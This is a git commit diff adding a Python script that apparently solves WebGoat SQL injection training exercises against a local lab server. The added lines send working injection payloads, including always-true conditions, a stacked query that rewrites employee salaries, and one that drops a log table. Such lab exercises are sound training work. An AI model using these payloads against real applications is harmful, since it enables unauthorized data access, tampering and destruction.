8c2ee8b0a80c88860088deaecd18da5276ed8ce3
Yohan Kim <yohan.kim.1@etsmtl.net>
2023-02-27 19:15:21 -0500

    added some sql injection

--- main.py
+++ main.py
@@ -7,7 +7,7 @@
 
 import requests
 
-host="http://10.0.2.15:8080/WebGoat"
+host="http://10.0.2.5:8080/WebGoat"
 
 s = requests.Session()
 
@@ -24,4 +24,24 @@ print(r)
 
 params = { 'query':"select department from Employees where first_name='Bob'" }
 r = s.post(host + "/SqlInjection/attack2", params=params)
-print(r.text)
+print(r)
+
+params = { 'account':"=Smith'", 'operator':"or", 'injection':"'1'='1" }
+r = s.post(host + "/SqlInjection/assignment5a", params=params)
+print(r)
+
+params = { 'login_count':'1', 'userid':"0 or 1=1" }
+r = s.post(host + "/SqlInjection/assignment5b", params=params)
+print(r)
+
+params = { 'name':"Smith' or 1=1;--", 'auth_tan':'3SL99A' }
+r = s.post(host + "/SqlInjection/attack8", params=params)
+print(r)
+
+params = { 'name':"Smith'; update employees set salary=999999 where last_name='Smith';--", 'auth_tan':'3SL99A' }
+r = s.post(host + "/SqlInjection/attack9", params=params)
+print(r)
+
+params = { 'action_string':"';drop table access_log;--" }
+r = s.post(host + "/SqlInjection/attack10", params=params)
+print(r)
